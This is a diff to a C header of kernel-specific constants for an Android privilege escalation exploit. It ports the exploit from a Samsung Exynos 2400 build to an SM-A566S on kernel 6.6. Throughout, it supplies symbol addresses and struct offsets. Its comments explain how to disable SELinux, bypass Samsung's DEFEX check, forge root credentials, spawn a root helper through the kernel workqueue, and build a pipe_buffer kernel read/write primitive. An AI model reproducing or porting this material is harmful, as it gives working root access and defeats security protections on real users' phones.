@@ -3,8 +3,8 @@
  * payload.  Everything in this file is specific to ONE kernel build; the
  * payload logic in timer.c is generic.
  *
- * Device: Samsung SM-S921N (e1s), Exynos 2400
- * Kernel: 6.1.162-android14-11 (OneUI 9)
+ * Device: Samsung SM-A566S (a56x), Exynos 1580
+ * Kernel: 6.6.127-android15-8-abA566SKSUADZJ1-4k (OneUI 9)
  *
  * Derived from the device's vmlinux (symtab + disasm).  To port to another
  * kernel, re-derive each group:
@@ -22,21 +22,21 @@
  * channel both hard-code 4 KB pages.  16 KB-page devices need a port. */
 #define PAGE 4096UL
 
-/* do_timer_create+0x9a, return address of the
+/* do_timer_create+0xa8, return address of the
  * kmem_cache_alloc(posix_timers_cache, GFP_KERNEL|__GFP_ZERO) call. */
-#define STATIC_TIMER_SITE 0xffffffc008194fe0ULL
-#define TIMER_SITE_LOW21 0x184fe0ULL
+#define STATIC_TIMER_SITE 0xffffffc080196b5cULL
+#define TIMER_SITE_LOW21 0x196b5cULL
 /* posix_timers_cache object: sizeof(struct k_itimer) on this build.
  * The cache has no SLAB_HWCACHE_ALIGN, so bytes_req == bytes_alloc. */
 #define TIMER_ALLOC 0x108ULL
 
-/* cred_jar: sizeof(struct cred) (176) and the HWCACHE_ALIGN bytes_alloc. */
-#define CRED_REQ 0xb0ULL
+/* cred_jar: sizeof(struct cred) (184) and the HWCACHE_ALIGN bytes_alloc. */
+#define CRED_REQ 0xb8ULL
 #define CRED_ALLOC 0xc0ULL
 
 /* Link-time addresses (symtab) and BTF field offsets. */
-#define SELINUX_STATE_STATIC 0xffffffc00a5ea4a8ULL
-#define PANIC_ON_WARN_STATIC 0xffffffc00a2eac00ULL
+#define SELINUX_STATE_STATIC 0xffffffc08257e7c8ULL
+#define PANIC_ON_WARN_STATIC 0xffffffc08231ac0cULL
 
 /*
  * The rb_erase zero-plant aimed at selinux_state: writing 8 zero bytes at
@@ -56,20 +56,20 @@
 
 /*
  * workqueue UMH injection (fusion-s24u install_workqueue_umh_root, ported
- * to this 6.1 kernel's offsets).  A fake work_struct whose func is
+ * to this 6.6 kernel's offsets).  A fake work_struct whose func is
  * call_usermodehelper_exec_work is linked into the idle system_unbound_wq
  * pool worklist; the kernel then spawns our helper as a legitimate root
  * usermodehelper, which sidesteps Samsung DEFEX entirely (no cred forgery
  * for it to catch).  Offsets verified against vmlinux.elf disasm:
- *   wq->dfl_pwq 0x110 (a2+272 in __queue_work)
+ *   wq->dfl_pwq 0xb0 (BTF and __queue_work disassembly)
  *   pwq->pool 0x00, pwq->wq 0x08, pwq->work_color 0x10 (dword+16),
  *   pwq->nr_in_flight 0x1c+4*color, pwq->nr_active 0x5c, max_active 0x60
- *   pool->worklist 0x28, pool->nr_idle 0x20 (v3+32 in process_one_work)
+ *   pool->worklist 0x28, pool->nr_workers 0x38, pool->nr_idle 0x3c
  *   work->data 0x00 (pwq|color<<4|5), work->entry 0x08, work->func 0x18
  */
-#define SYSTEM_UNBOUND_WQ_STATIC 0xffffffc00a2eac58ULL
-#define UMH_EXEC_WORK_STATIC 0xffffffc0080d4584ULL
-#define WQ_DFL_PWQ_OFF 0x110
+#define SYSTEM_UNBOUND_WQ_STATIC 0xffffffc08231ac60ULL
+#define UMH_EXEC_WORK_STATIC 0xffffffc0800d1b4cULL
+#define WQ_DFL_PWQ_OFF 0xb0
 #define PWQ_POOL_OFF 0x00
 #define PWQ_WQ_OFF 0x08
 #define PWQ_WORK_COLOR_OFF 0x10
@@ -133,20 +133,20 @@ struct umh_subprocess_info
 /*
  * DEFEX credential-violation bypass: task_defex_check_creds() calls
  * get_task_creds(), which looks the task up in creds_fast_hash
- * (0xffffffc00a66e9f8, .data -- writable, unlike the creds_fast_hash_ready
+ * (0xffffffc082602df8, .data -- writable, unlike the creds_fast_hash_ready
  * gate in rodata).  A NULL bucket entry makes get_task_creds return
  * stored uid 0, which matches the forged uid 0, so check_creds returns 0
  * (no violation) via the +0x740 path ("mov w0, wzr; ret", verified).
  * creds_hash is an 8-byte pointer array indexed directly by pid when
  * pid <= 0x8000.
  */
-#define CREDS_FAST_HASH_STATIC 0xffffffc00a66e9f8ULL
+#define CREDS_FAST_HASH_STATIC 0xffffffc082602df8ULL
 
 /* cred field offsets. */
-#define CRED_UID_OFF 0x4ULL
+#define CRED_UID_OFF 0x8ULL
 /* securebits: clearing it drops Android's SECURE_NOROOT, so an euid=0
  * exec grants the bounding-set capabilities again. */
-#define CRED_SECUREBITS_OFF 0x24ULL
+#define CRED_SECUREBITS_OFF 0x28ULL
 /* Only capability/selinux/integrity are built in and only SELinux wants a
  * cred blob, so lsm_set_blob_sizes() leaves its offset at 0. */
 #define SELINUX_BLOB_OFF 0x0ULL
@@ -155,41 +155,41 @@ struct umh_subprocess_info
 #define FULLCAP 0x1ffffffffffULL
 
 /* Link-time symbols for the fake cred's refcounted sub-objects. */
-#define ROOT_USER_STATIC 0xffffffc00a310a00ULL
-#define INIT_USER_NS_STATIC 0xffffffc00a310770ULL
-#define INIT_UCOUNTS_STATIC 0xffffffc00a3121d8ULL
-#define INIT_GROUPS_STATIC 0xffffffc00a311d20ULL
+#define ROOT_USER_STATIC 0xffffffc08233f0a0ULL
+#define INIT_USER_NS_STATIC 0xffffffc08233ee10ULL
+#define INIT_UCOUNTS_STATIC 0xffffffc082340c70ULL
+#define INIT_GROUPS_STATIC 0xffffffc082340600ULL
 
 /* task_struct::cred and dup_task_struct()'s task_struct_cachep call site. */
-#define OFF_TASK_CRED 0x838ULL
-#define TASK_ALLOC_LOW21 0xacb7cULL
+#define OFF_TASK_CRED 0x820ULL
+#define TASK_ALLOC_LOW21 0xacc74ULL
 #define TASK_ALLOC_BYTES 0x12c0ULL
 /* Unslid call sites (from vmlinux.elf): prepare_creds' kmem_cache_alloc
  * return address and dup_task_struct's kmem_cache_alloc_node return
  * address.  The runtime slide is 64KB-granular, so sites are matched as
  * site_static + slide. */
-#define CRED_SITE_STATIC 0xffffffc0080e5e70ULL
-#define TASK_SITE_STATIC 0xffffffc0080acb7cULL
+#define CRED_SITE_STATIC 0xffffffc0800e4aa4ULL
+#define TASK_SITE_STATIC 0xffffffc0800acc74ULL
 
 /*
- * posix-cpu-timer queue leftmosts inside task_struct (task+0x798/0x7B0/
- * 0x7C8 are the queue roots; the walk reads the leftmost first and skips
+ * posix-cpu-timer queue leftmosts inside task_struct (task+0x780/0x798/
+ * 0x7B0 are the queue roots; the walk reads the leftmost first and skips
  * a queue whose leftmost is NULL -- verified in our vmlinux:
- * LDR X20,[X19,#0x7A0]; CBZ).  Zeroing these three makes a reap of a
+ * LDR X20,[X19,#0x788]; CBZ).  Zeroing these three makes a reap of a
  * failed-plant zombie safe; the roots are never dereferenced.
  */
-#define OFF_TQ_LEFTMOST_0 0x7A0ULL
-#define OFF_TQ_LEFTMOST_1 0x7B8ULL
-#define OFF_TQ_LEFTMOST_2 0x7D0ULL
+#define OFF_TQ_LEFTMOST_0 0x788ULL
+#define OFF_TQ_LEFTMOST_1 0x7A0ULL
+#define OFF_TQ_LEFTMOST_2 0x7B8ULL
 
 /*
- * task_struct::loginuid (sessionid at +0x8FC).  The zombie-repair probe
+ * task_struct::loginuid (sessionid at +0x8E4).  The zombie-repair probe
  * writes here and reads it back through /proc/<pid>/loginuid, which is
  * world-readable -- unlike panic_on_warn, which is root-only on Samsung
  * builds.  Verified in our vmlinux: proc_loginuid_read does
- * "LDR W3,[X0,#0x8F8]".
+ * "LDR W3,[X0,#0x8E0]".
  */
-#define OFF_TASK_LOGINUID 0x8F8ULL
+#define OFF_TASK_LOGINUID 0x8E0ULL
 
 /*
  * pipe_buffer kernel read/write primitive (RiosWesley/SamTimer design):
@@ -198,17 +198,16 @@ struct umh_subprocess_info
  * page.  read() then copies kernel memory to userspace, and a CAN_MERGE
  * write() merges into it.  Constants:
  *   ANON_PIPE_BUF_OPS_STATIC  anon_pipe_buf_ops link-time address
- *                             (readelf -sW vmlinux.elf, e1s build)
+ *                             (readelf -sW vmlinux.elf, a56x build)
  *   VMEMMAP_BASE              vmemmap region base (VA_BITS=39 layout,
- *                             same as the e3q 6.1.162-android14 build)
+ *                             verified for this VA_BITS=39 build)
  *   STRUCT_PAGE_SIZE          sizeof(struct page) = 0x40
- *   MEMSTART_ADDR             physical DRAM base (Exynos 2400: 0x80000000);
- *                             verified at runtime from /proc/iomem
+ *   MEMSTART_ADDR             physical DRAM base (Exynos 1580: 0x80000000)
  *   PIPE_INFO_BUF_OFF         pipe_inode_info::bufs
  *   PIPE_BUF_FAKE_OFF         where the fake pipe_buffer sits relative to
  *                             the rb node (buffer slot 1: pipe->tail == 1)
  */
-#define ANON_PIPE_BUF_OPS_STATIC 0xffffffc00921eb10ULL
+#define ANON_PIPE_BUF_OPS_STATIC 0xffffffc081267d88ULL
 #define VMEMMAP_BASE 0xfffffffe00000000ULL
 #define MEMSTART_ADDR 0x80000000ULL
 #define STRUCT_PAGE_SIZE 0x40ULL
@@ -220,13 +219,12 @@ struct umh_subprocess_info
  * system_unbound_wq) are read through their linear-map alias, which needs
  * the physical load address of the (unslid) image; the KASLR slide is
  * added at use.  KERNEL_PHYS_LOAD is the boot loader's kernel load
- * address -- the same platform convention as the e3q 6.1.162-android14
- * build (0xa8000000).  If a device differs, the umh dry run finds the
+ * address. If a device differs, the umh dry run finds the
  * right one from KERNEL_PHYS_CANDIDATES by read-only validation (the
  * wq pointer range check and pwq->wq match) before anything is written.
  */
-#define KERNEL_VA_BASE 0xffffffc008000000ULL
-/* Validated on e1s by the umh dry run: the kernel is loaded at the DRAM
+#define KERNEL_VA_BASE 0xffffffc080000000ULL
+/* Validated on a56x by the umh dry run: the kernel is loaded at the DRAM
  * base (unslid; slide is added at use). */
 #define KERNEL_PHYS_LOAD 0x80000000ULL
 /* Unslid kernel phys-base candidates for the dry-run validation loop. */
